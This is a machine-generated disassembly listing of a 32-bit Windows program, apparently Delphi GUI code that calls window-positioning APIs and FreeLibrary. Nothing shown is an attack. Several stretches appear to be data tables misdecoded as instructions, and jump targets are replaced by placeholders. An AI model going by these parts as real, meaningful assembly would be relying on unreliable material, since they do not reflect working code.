mov eax [ ebp - 0x18 ]
push eax
call DeferWindowPos
mov [ ebp - 0x18 ] eax
mov dl 0x1
mov eax edi
call sub_442ad8
inc [ ebp - 0x14 ]
dec [ ebp - 0x20 ]
jne r-xdata
mov eax ebx
call sub_4425bc
sub eax [ ebp - 0x1c ]
sub eax [ ebp - 0x8 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebx + 0x210 ]
mov edx [ ebp - 0x14 ]
call sub_41a468
mov edi eax
mov dl [ ebx + 0x5f ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
add eax 0x8
mov [ ebp - 0x1c ] eax
mov eax edi
mov si 0xffc8
call sub_403430
test al al
je r-xdata
sub_432868
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x221 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_41a4c4
mov [ ebx + 0x218 ] eax
mov eax ebx
call sub_4427c4
mov eax ebx
mov si 0xffeb
call sub_403430
sub_4328a0
push ebx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebx + 0x218 ]
jg r-xdata
mov eax ebx
call sub_432a18
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
mov [ ebx + 0x218 ] eax
sub_432914
push ebx
push esi
push edi
mov esi edx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x210 ]
cmp esi [ eax + 0x8 ]
jg r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_432438
jmp r-xdata
mov edi [ ebx + 0x210 ]
cmp esi [ edi + 0x8 ]
jl r-xdata
mov eax edi
call sub_41a550
call sub_403234
pop edi
pop esi
pop ebx
retn
sub_432954
push ebx
mov ebx eax
cmp edx 0x1
jge r-xdata
cmp edx 0x10
jle r-xdata
mov edx 0x1
cmp edx [ ebx + 0x21c ]
je r-xdata
mov edx 0x10
pop ebx
retn
mov [ ebx + 0x21c ] edx
mov eax ebx
call sub_4326d0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43298c
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
je r-xdata
cmp esi 0xffffffff
jge r-xdata
mov [ ebx + 0x218 ] esi
jmp r-xdata
mov ebp [ ebx + 0x210 ]
mov eax [ ebp + 0x8 ]
cmp esi eax
jl r-xdata
or esi 0xffffffff
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x218 ]
cmp esi edi
je r-xdata
mov esi eax
dec esi
test edi edi
jl r-xdata
mov edi esi
mov [ ebx + 0x218 ] edi
test edi edi
jl r-xdata
mov edx edi
mov eax ebp
call sub_41a468
xor edx edx
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_41a468
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xcc ]
sub_432a18
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_432ae1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx eax
mov eax ebx
call sub_432914
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebx + 0x218 ] 0x0
jl r-xdata
inc eax
mov [ ebp - 0x4 ] eax
xor esi esi
mov eax ebx
call sub_4326d0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432ae8
lea eax [ ebp - 0x8 ]
call sub_404008
retn
mov [ ebx + 0x221 ] 0x1
mov edx [ ebx + 0x218 ]
mov eax [ ebx + 0x210 ]
call sub_41a468
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov [ ebx + 0x221 ] 0x0
lea ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebx + 0x214 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x8 ]
push eax
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_41a468
pop edx
call sub_442be8
inc esi
dec [ ebp - 0x4 ]
jne r-xdata
sub_432af0
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_44888c
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_41a468
pop edx
mov ecx [ eax ]
call [ ecx + 0x64 ]
inc edi
dec esi
jne r-xdata
sub_432b64
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx esi
xor edx edx
mov eax edi
call sub_438ddc
mov edx r-xdata
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov dl 0x1
mov eax edi
call sub_420e84
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax edi
test bl bl
je r-xdata
mov edx [ esi + 0x8 ]
mov eax edi
call sub_442be8
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_432bd5
add [ eax ] al
add [ ebx + 0x56 ] dl
mov ebx eax
mov eax ebx
call sub_439110
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
mov dl [ eax + 0x224 ]
call sub_432d84
sub_432c24
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_432c20
push eax
push esi
mov eax ebx
call sub_432c1c
push eax
mov eax ebx
call sub_432c18
mov edx eax
mov eax ebx
pop ecx
mov ebx [ eax ]
call [ ebx + 0x84 ]
pop esi
pop ebx
retn
sub_432c54
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov eax ebx
call sub_432c14
push eax
mov eax ebx
call sub_432c1c
push eax
mov eax ebx
call sub_432c18
mov edx eax
mov eax ebx
pop ecx
mov ebx [ eax ]
call [ ebx + 0x84 ]
pop esi
pop ebx
retn
sub_432c84
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_439424
mov [ esi + 0x224 ] 0x0
mov [ esi + 0x228 ] 0x3
mov eax esi
call sub_432f6c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax esi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_432cf0
push esi
mov esi eax
mov eax esi
call sub_44888c
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov eax [ esi + 0x220 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
pop esi
retn
sub_432d2c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_442088
cmp esi [ edi + 0x220 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor eax eax
mov [ edi + 0x220 ] eax
sub_432d5c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_448d8c
mov dl [ ebx + 0x224 ]
mov eax ebx
call sub_432d84
pop ebx
pop ebp
retn 0x8
sub_432d84
push ebx
push esi
add esp 0xfffffff8
mov esi eax
cmp [ esi + 0x220 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov [ esi + 0x224 ] dl
sub dl 0x1
jb r-xdata
mov eax [ esi + 0x220 ]
call sub_432c14
mov edx [ esi + 0x44 ]
sub edx eax
sub edx [ esi + 0x228 ]
mov ecx esp
mov eax [ esi + 0x40 ]
call sub_41900c
jmp r-xdata
je r-xdata
mov ebx [ esi + 0x220 ]
mov eax ebx
call sub_432c20
push eax
mov eax [ esi + 0x220 ]
call sub_432c14
push eax
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov ecx esp
mov edx [ esi + 0x44 ]
add edx [ esi + 0x4c ]
add edx [ esi + 0x228 ]
mov eax [ esi + 0x40 ]
call sub_41900c
jmp r-xdata
dec dl
je r-xdata
mov eax [ esi + 0x220 ]
call sub_432c14
mov edx [ esi + 0x4c ]
sub edx eax
sar edx 0x1
jns r-xdata
dec dl
je r-xdata
add edx [ esi + 0x44 ]
push edx
mov eax [ esi + 0x220 ]
call sub_432c20
push eax
mov eax [ esi + 0x40 ]
pop edx
sub eax edx
sub eax [ esi + 0x228 ]
lea ecx [ esp + 0x4 ]
pop edx
call sub_41900c
jmp r-xdata
adc edx 0x0
mov eax [ esi + 0x220 ]
call sub_432c14
mov edx [ esi + 0x4c ]
sub edx eax
sar edx 0x1
jns r-xdata
jmp r-xdata
add edx [ esi + 0x44 ]
mov ecx esp
mov eax [ esi + 0x40 ]
add eax [ esi + 0x48 ]
add eax [ esi + 0x228 ]
call sub_41900c
adc edx 0x0
sub_432ea4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_432f2a
push [ fs : eax ]
mov [ fs : eax ] esp
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx esi
mov eax ebx
call sub_4429a0
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax [ ebx + 0x220 ]
call sub_442b2c
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432f31
lea eax [ ebp - 0x4 ]
call sub_404008
retn
xor edx edx
mov eax ebx
call sub_442be8
mov edx esi
mov eax [ ebx + 0x220 ]
call sub_442be8
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x220 ]
call sub_442bb8
mov eax [ ebp - 0x4 ]
mov edx [ ebx + 0x8 ]
call sub_4080bc
test eax eax
jne r-xdata
sub_432f38
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_442a8c
mov edi [ ebx + 0x220 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov dl 0x1
mov eax [ ebx + 0x220 ]
call sub_442ad8
sub_432f6c
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_432b64
mov esi eax
mov [ ebx + 0x220 ] esi
mov edx ebx
mov eax esi
call sub_4207e4
mov edx ebx
mov eax [ ebx + 0x220 ]
call sub_439224
sub_432fa8
push 0x2c004806
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ 0x680000ff ] ch
push es
dec eax
add [ esi ] ch
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ edi ] ch
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ eax ] dl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ ecx ] dl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ edx ] dl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ ebx ] dl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ edi + edi * 8 ] dl
add [ eax ] al
push 0x15004806
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ esi ] dl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ edi ] dl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ eax ] bl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ ecx ] bl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ edx ] bl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ ebx ] bl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ edi + edi * 8 ] bl
add [ eax ] al
push 0x1d004806
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ esi ] bl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ edi ] bl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ eax ] al
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ ecx ] al
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ edx ] al
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ ebx ] al
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ edi + edi * 8 ] al
add [ eax ] al
push 0x5004806
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ esi ] al
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ edi ] al
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ eax ] cl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ ecx ] cl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ edx ] cl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ ebx ] cl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ edi + edi * 8 ] cl
add [ eax ] al
push 0xd004806
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ esi ] cl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ edi ] cl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add al dh
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add cl dh
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add dl dh
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add bl dh
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add ah dh
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add ch dh
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add dh dh
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add bh dh
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add al bh
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add cl bh
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add dl bh
inc [ eax ]
add [ edi ] ch
add [ eax ] al
add [ edx + ebp * 8 + 0x47 ] ch
add [ eax ] bl
xor [ ebx ] eax
0x31100047 0x43
sub_433154
cmp al 0xea
inc edi
add al ch
xor [ ebx ] al
xor al 0xea
inc edi
add al ah
xor [ ebx ] al
sub al 0xea
inc edi
add al bl
xor [ ebx ] al
and al 0xea
inc edi
add al dl
xor [ ebx ] al
sbb al 0xea
inc edi
add al cl
xor [ ebx ] al
adc al 0xea
inc edi
add al al
xor [ ebx ] al
or al 0xea
inc edi
add [ eax + 0x4004330 ] bh
0x30b00047 0x43
sub_433314
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_433339
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433340
retn
sub_43334c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43337d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433384
retn
mov eax [ rw-data ]
call sub_403234
sub_433458
add [ eax ] al
add [ eax ] al
mov edx gs
inc edi
add al ah
clc
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x3c0047ea ] cl
cli
inc edi
add [ eax ] al
add [ eax ] al
add [ edx + ebp * 8 - 0x29fffb9 ] al
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x73ffb816 ] al
cli
inc edi
add [ eax ] al
add [ eax ] al
add [ edx + ebp * 8 + 0x47 ] bh
add [ ebx + edi * 8 + 0x47 ] bl
add [ eax ] al
add [ eax ] al
add [ eax - 0x16 ] bh
inc edi
add [ edi * 8 + 0x47 ] ah
add [ eax ] al
je r-xdata
pop esp
sti
inc edi
inc edi
add [ eax + 0x47f7 ] bl
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_4334dc
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4334e3
retn
call sub_433418
sub_433510
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_433535
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43353c
retn
sub_433557
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_43359c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4335a3
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404abc
sub_4335bf
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_433604
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43360b
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404abc
sub_43361b
dec [ edx ]
add [ eax ] al
add [ ebp + 0x41 ] cl
push eax
dec ecx
xor esi [ edx ]
inc esp
dec esp
dec esp
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_433671
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433678
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_404008
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_433684
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4336c8
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4336cf
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_4336dc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_433701
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433708
retn
sub_433814
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_433883
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43388a
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_404a70
mov eax rw-data
mov edx [ r-xdata ]
call sub_404a70
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_433adc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
call sub_42d2d4
mov [ esi + 0x5 ] al
call sub_4337b4
cmp eax 0x60000
setge al
mov [ esi + 0x4 ] al
mov eax esi
call sub_434320
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax esi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_433b28
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
mov eax esi
call sub_433bc8
call sub_42d114
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403224
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_433b5c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp [ esi + 0x6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ esi + eax * 4 + 0x8 ]
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al bl
cmp [ esi + eax * 4 + 0x8 ] 0x0
jne r-xdata
mov edi ebx
and edi 0x7f
mov eax [ edi * 4 + rw-data ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esi + edi * 4 + 0x8 ] eax
sub_433bc8
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
inc ebx
cmp bl 0x18
jne r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
xor eax eax
mov [ esi + edi * 4 + 0x8 ] eax
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_433c0c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_433b5c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_433c58
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_433b5c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_433c9c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x10 ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov al 0x1
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov dl [ ebx ]
mov eax esi
call sub_433b5c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
test al al
je r-xdata
sub_433d04
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov ebx eax
mov esi [ ebp + 0x14 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax esi
call sub_404880
push eax
mov eax esi
call sub_404870
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push edi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_433b5c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_433d68
mov [ ecx ] 0x0
xor eax eax
mov al dl
cmp eax 0xf
jge r-xdata
add eax 0xfffffff1
sub eax 0xc
jb r-xdata
add eax 0xfffffffe
sub eax 0x5
jb r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xf
jmp r-xdata
sub eax 0x2
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x8
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x4
mov eax 0x1b
jmp r-xdata
je r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x7
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0x1d
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_433dec
mov [ ecx ] 0x3
mov eax edx
add al 0xfe
sub al 0x7
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
je r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x9
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_433e28
mov [ ecx ] 0x17
xor eax eax
mov al dl
cmp eax 0x68
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
mov al [ eax + lookup_table_433e45 ]
jmp [ eax * 4 + jump_table_433eae ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x5
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x8
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0xb
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xe
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x11
jmp r-xdata
mov [ ecx + 0x4 ] 0x7
mov eax 0x14
jmp r-xdata
mov [ ecx + 0x4 ] 0x8
mov eax 0x16
jmp r-xdata
mov [ ecx + 0x4 ] 0x9
mov eax 0x18
jmp r-xdata
mov [ ecx + 0x4 ] 0xa
mov eax 0x1a
jmp r-xdata
mov [ ecx + 0x4 ] 0xb
mov eax 0x1c
jmp r-xdata
mov [ ecx + 0x4 ] 0xc
mov eax 0x1e
jmp r-xdata
mov [ ecx + 0x4 ] 0xd
mov eax 0x20
jmp r-xdata
mov [ ecx + 0x4 ] 0xe
mov eax 0x24
jmp r-xdata
mov [ ecx + 0x4 ] 0xf
mov eax 0x28
jmp r-xdata
mov [ ecx + 0x4 ] 0x10
mov eax 0x2c
jmp r-xdata
mov [ ecx + 0x4 ] 0x11
mov eax 0x30
jmp r-xdata
mov [ ecx + 0x4 ] 0x12
mov eax 0x34
jmp r-xdata
mov [ ecx + 0x4 ] 0x13
mov eax 0x38
jmp r-xdata
mov [ ecx + 0x4 ] 0x14
mov eax 0x3c
jmp r-xdata
mov [ ecx + 0x4 ] 0x15
mov eax 0x40
jmp r-xdata
mov [ ecx + 0x4 ] 0x16
mov eax 0x44
jmp r-xdata
mov [ ecx + 0x4 ] 0x17
mov eax 0x48
jmp r-xdata
mov [ ecx + 0x4 ] 0x18
mov eax 0x4c
jmp r-xdata
mov [ ecx + 0x4 ] 0x19
mov eax 0x50
jmp r-xdata
mov [ ecx + 0x4 ] 0x1a
mov eax 0x54
jmp r-xdata
mov [ ecx + 0x4 ] 0x1b
mov eax 0x58
jmp r-xdata
mov [ ecx + 0x4 ] 0x1c
mov eax 0x5c
jmp r-xdata
mov [ ecx + 0x4 ] 0x1d
mov eax 0x60
jmp r-xdata
mov [ ecx + 0x4 ] 0x1e
mov eax 0x61
jmp r-xdata
mov [ ecx + 0x4 ] 0x1f
mov eax 0x62
jmp r-xdata
mov [ ecx + 0x4 ] 0x20
mov eax 0x63
jmp r-xdata
mov [ ecx + 0x4 ] 0x21
mov eax 0x64
jmp r-xdata
mov [ ecx + 0x4 ] 0x22
mov eax 0x65
jmp r-xdata
mov [ ecx + 0x4 ] 0x23
mov eax 0x66
jmp r-xdata
mov [ ecx + 0x4 ] 0x24
mov eax 0x67
jmp r-xdata
mov [ ecx + 0x4 ] 0x25
mov eax 0x68
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_4341b4
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
push 0xffffffec
mov eax [ ebp - 0x4 ]
call sub_4493d8
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4493d8
push eax
call GetWindowRect
mov eax [ ebp - 0x24 ]
neg eax
push eax
mov eax [ ebp - 0x28 ]
neg eax
push eax
lea eax [ ebp - 0x28 ]
push eax
